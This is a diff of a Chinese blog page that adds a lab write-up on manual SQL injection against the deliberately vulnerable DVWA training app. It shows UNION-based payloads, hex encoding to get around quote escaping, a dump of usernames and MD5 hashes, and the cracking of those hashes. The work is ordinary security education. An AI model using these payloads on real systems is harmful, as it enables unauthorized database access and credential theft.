@@ -6,19 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://xiewangdong.coding.me/Blog">
-  <title>Archives: 2019/6 | 熊窝</title>
+  <title>DVWA_SQL手动注入实验 | 熊窝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="小熊开大">
-<meta name="keywords" content="Qt WPF">
-<meta property="og:type" content="website">
-<meta property="og:title" content="熊窝">
-<meta property="og:url" content="http://xiewangdong.coding.me/Blog/archives/2019/06/index.html">
+  <meta name="description" content="实验目的 掌握SQL注入攻击的基本原理 掌握识别SQL注入点并利用其进行攻击的基本方法  实验内容采用SQL注入的方法，针对DVWA Medium模式下的SQL Injection模块进行攻击，获取数据库表数据信息。">
+<meta name="keywords" content="SQL">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA_SQL手动注入实验">
+<meta property="og:url" content="http://xiewangdong.coding.me/Blog/posts/programming/2019-06-28-DVWA-SQL注入实验.html">
 <meta property="og:site_name" content="熊窝">
-<meta property="og:description" content="小熊开大">
+<meta property="og:description" content="实验目的 掌握SQL注入攻击的基本原理 掌握识别SQL注入点并利用其进行攻击的基本方法  实验内容采用SQL注入的方法，针对DVWA Medium模式下的SQL Injection模块进行攻击，获取数据库表数据信息。">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://xiewangdong.coding.me/Blog/posts/programming/2019-06-28-DVWA-SQL注入实验/1.png">
+<meta property="og:image" content="http://xiewangdong.coding.me/Blog/posts/programming/2019-06-28-DVWA-SQL注入实验/2.png">
+<meta property="og:image" content="http://xiewangdong.coding.me/Blog/posts/programming/2019-06-28-DVWA-SQL注入实验/3.png">
+<meta property="og:updated_time" content="2019-06-29T02:48:28.546Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="熊窝">
-<meta name="twitter:description" content="小熊开大">
+<meta name="twitter:title" content="DVWA_SQL手动注入实验">
+<meta name="twitter:description" content="实验目的 掌握SQL注入攻击的基本原理 掌握识别SQL注入点并利用其进行攻击的基本方法  实验内容采用SQL注入的方法，针对DVWA Medium模式下的SQL Injection模块进行攻击，获取数据库表数据信息。">
+<meta name="twitter:image" content="http://xiewangdong.coding.me/Blog/posts/programming/2019-06-28-DVWA-SQL注入实验/1.png">
   
     <link rel="alternative" href="/atom.xml" title="熊窝" type="application/atom+xml">
   
@@ -164,16 +169,14 @@ var _hmt = _hmt || [];
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-DVWA-SQL注入实验" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-DVWA-SQL注入实验" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/Blog/posts/programming/2019-06-28-DVWA-SQL注入实验.html">DVWA_SQL手动注入实验</a>
+    <h1 class="article-title" itemprop="name">
+      DVWA_SQL手动注入实验
     </h1>
   
 
@@ -191,9 +194,59 @@ var _hmt = _hmt || [];
 <li>掌握识别SQL注入点并利用其进行攻击的基本方法</li>
 </ol>
 <h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><p>采用SQL注入的方法，针对DVWA Medium模式下的SQL Injection模块进行攻击，获取数据库表数据信息。</p>
-        
-          <a class="article-more-a" href="/Blog/posts/programming/2019-06-28-DVWA-SQL注入实验.html#more">more >></a>
-        
+<a id="more"></a>
+<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>Windwos 7 + Apache 2.4.27 + PHP 5.6.31 + DVWA 1.9 + Chrome浏览器</p>
+<h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><ul>
+<li>登陆DVWA实验环境，用户名为<code>admin</code>，密码为<code>password</code>；</li>
+<li>点击<code>Submit</code>按钮，观察页面返回值。</li>
+</ul>
+<p><img src="2019-06-28-DVWA-SQL注入实验/1.png" alt=""></p>
+<ul>
+<li>使用浏览器<code>开发者工具</code>修改下拉框中<code>1</code>对应的<code>value</code>值为<code>1 or 1=1</code>，点击<code>Submit</code>提交，触发SQL注入漏洞，确定下拉列表项的<code>value</code>属性值为注入点；</li>
+</ul>
+<p><img src="2019-06-28-DVWA-SQL注入实验/2.png" alt=""></p>
+<h2 id="实施攻击"><a href="#实施攻击" class="headerlink" title="实施攻击"></a>实施攻击</h2><ul>
+<li><p>继续使用浏览器<code>开发者工具</code>修改<code>1</code>的<code>value</code>值，输入 <code>1 or 1=1 order by 5</code>，探测SQL语句列数；</p>
+<blockquote>
+<p>返回报错 <code>Unknown column &#39;5&#39; in &#39;order clause&#39;</code></p>
+</blockquote>
+<p>输入 <code>1 or 1=1 order by 3</code></p>
+<blockquote>
+<p>返回报错 <code>Unknown column &#39;2&#39; in &#39;order clause&#39;</code></p>
+</blockquote>
+<p>输入 <code>1 or 1=1 order by 2</code>，提交后正常返回，由此确定原SQL语句列数为2；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ID: 1 or 1=1 order by 2</span><br><span class="line">First name: admin</span><br><span class="line">Surname: admin</span><br><span class="line">ID: 1 or 1=1 order by 2</span><br><span class="line">First name: Gordon</span><br><span class="line">Surname: Brown</span><br><span class="line">ID: 1 or 1=1 order by 2</span><br><span class="line">First name: Hack</span><br><span class="line">Surname: Me</span><br><span class="line">ID: 1 or 1=1 order by 2</span><br><span class="line">First name: Pablo</span><br><span class="line">Surname: Picasso</span><br><span class="line">ID: 1 or 1=1 order by 2</span><br><span class="line">First name: Bob</span><br><span class="line">Surname: Smith</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>输入<code>0 union select 1,2</code>，确定数据回显位置；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: 0 union select 1,2</span><br><span class="line">First name: 1</span><br><span class="line">Surname: 2</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>输入<code>0 union select user(),database()</code>，确定用户名和数据库名；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: 0 union select user(),database()</span><br><span class="line">First name: root@localhost</span><br><span class="line">Surname: dvwa</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>输入<code>0 union select &#39;table_name&#39;,group_concat(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39;</code>，发现单引号被转义；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;\&apos;table_name\&apos;,group_concat(table_name) from information_schema.tables where tab&apos; at line 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>采用十六进制编码来规避单引号转义，使用<code>Burp Suite</code> 软件的<code>Decoder</code>模块将<code>table_name</code>转换为十六进制<code>0x7461626c655f6e616d65</code>，将<code>dvwa</code>使用<code>database()</code>替换；</p>
+</li>
+</ul>
+<p><img src="2019-06-28-DVWA-SQL注入实验/3.png" alt=""></p>
+<ul>
+<li><p>修改后的拼接SQL语句为<code>0 union select 0x7461626c655f6e616d65,group_concat(table_name) from information_schema.tables where table_schema=database()</code>；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: 0 union select 0x7461626c655f6e616d65,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br><span class="line">First name: table_name</span><br><span class="line">Surname: guestbook,users</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>dvwa</code>库中含有<code>guestbook</code>和<code>users</code>两个数据表，我们只关心<code>users</code>表，<code>users</code>的十六进制为<code>0x7573657273</code>；</p>
+</li>
+<li><p>输入<code>0 union select 0x7573657273,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273</code>，查询<code>users</code>的列名；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: 0 union select 0x7573657273,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273</span><br><span class="line">First name: users</span><br><span class="line">Surname: user_id,first_name,last_name,user,password,avatar,last_login,failed_login</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>输入<code>0 union select user,password from users</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ID: 0 union select user,password from users</span><br><span class="line">First name: admin</span><br><span class="line">Surname: 5f4dcc3b5aa765d61d8327deb882cf99</span><br><span class="line"></span><br><span class="line">ID: 0 union select user,password from users</span><br><span class="line">First name: gordonb</span><br><span class="line">Surname: e99a18c428cb38d5f260853678922e03</span><br><span class="line"></span><br><span class="line">ID: 0 union select user,password from users</span><br><span class="line">First name: 1337</span><br><span class="line">Surname: 8d3533d75ae2c3966d7e0d4fcc69216b</span><br><span class="line"></span><br><span class="line">ID: 0 union select user,password from users</span><br><span class="line">First name: pablo</span><br><span class="line">Surname: 0d107d09f5bbe40cade3de5c71e9e9b7</span><br><span class="line"></span><br><span class="line">ID: 0 union select user,password from users</span><br><span class="line">First name: smithy</span><br><span class="line">Surname: 5f4dcc3b5aa765d61d8327deb882cf99</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>自此，已得到<code>dvwa</code>用户表数据，由于密码使用md5加密，可使用<a href="https://www.cmd5.com/" target="_blank" rel="noopener">CMD5</a>在线破解，上述密码破解如下：</p>
+<p>| 用户名  |   密码   |               MD5                |<br>| :—–: | :——: | :——————————: |<br>|  admin  | password | 5f4dcc3b5aa765d61d8327deb882cf99 |<br>| gordonb |  abc123  | e99a18c428cb38d5f260853678922e03 |<br>|  1337   | charley  | 8d3533d75ae2c3966d7e0d4fcc69216b |<br>|  pablo  | letmein  | 0d107d09f5bbe40cade3de5c71e9e9b7 |<br>| smithy  | password | 5f4dcc3b5aa765d61d8327deb882cf99 |</p>
+</li>
+</ul>
+
       
 
       
@@ -226,16 +279,24 @@ var _hmt = _hmt || [];
 
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Blog/posts/programming/2019-06-28-DVWA-SQL注入实验.html">阅读全文 >></a>
-        </p>
-      
 
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/Blog/posts/programming/2019-06-27-Rookit实验.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Rookit实验</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -250,197 +311,34 @@ var _hmt = _hmt || [];
         </div>
         
         
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Rookit实验" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Blog/posts/programming/2019-06-27-Rookit实验.html">Rookit实验</a>
-    </h1>
-  
-
-        
-        <a href="/Blog/posts/programming/2019-06-27-Rookit实验.html" class="archive-article-date">
-  	<time datetime="2019-06-27T15:23:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-27</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol>
-<li>掌握windows rootkit的基本工作原理，熟练掌握并使用ssdt hook、IRP hook、DKOM等技术；</li>
-<li>掌握基本的windows核心编程，能够编写、调试windows驱动；</li>
-<li>掌握rootkit的基本使用方法。</li>
-</ol>
-<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><ol>
-<li>开源windows kernel rootkit zwhawk的工作原理、编译与调试；</li>
-<li>zwhawk代码的修改，实现其隐藏进程的功能。</li>
-</ol>
-        
-          <a class="article-more-a" href="/Blog/posts/programming/2019-06-27-Rookit实验.html#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">rootkit</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/Blog/categories/programming//" class="article-tag-list-link color2">programming</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Blog/posts/programming/2019-06-27-Rookit实验.html">阅读全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#实验目的"><span class="toc-number">1.</span> <span class="toc-text">实验目的</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#实验内容"><span class="toc-number">2.</span> <span class="toc-text">实验内容</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#实验环境"><span class="toc-number">3.</span> <span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#实验步骤"><span class="toc-number">4.</span> <span class="toc-text">实验步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#收集信息"><span class="toc-number">4.1.</span> <span class="toc-text">收集信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实施攻击"><span class="toc-number">4.2.</span> <span class="toc-text">实施攻击</span></a></li></ol></li></ol>
+                    </div>
+                </span>
             </div>
         </div>
         
-        
     </div>
 </aside>
 
 
 
-
-  
-    <article id="post-32位汇编总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Blog/posts/programming/2019-06-15-32位汇编总结.html">32位汇编总结</a>
-    </h1>
-  
-
-        
-        <a href="/Blog/posts/programming/2019-06-15-32位汇编总结.html" class="archive-article-date">
-  	<time datetime="2019-06-15T03:01:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><p>主要寄存器如下图所示：</p>
-<p><img src="2019-06-15-32位汇编总结/1.png" alt=""><br></p>
-        
-          <a class="article-more-a" href="/Blog/posts/programming/2019-06-15-32位汇编总结.html#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">汇编</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/Blog/categories/programming//" class="article-tag-list-link color2">programming</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Blog/posts/programming/2019-06-15-32位汇编总结.html">阅读全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
   
+  
+
+  
+
+  
+
+  
+
 
           </div>
         </div>
@@ -462,8 +360,8 @@ var _hmt = _hmt || [];
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
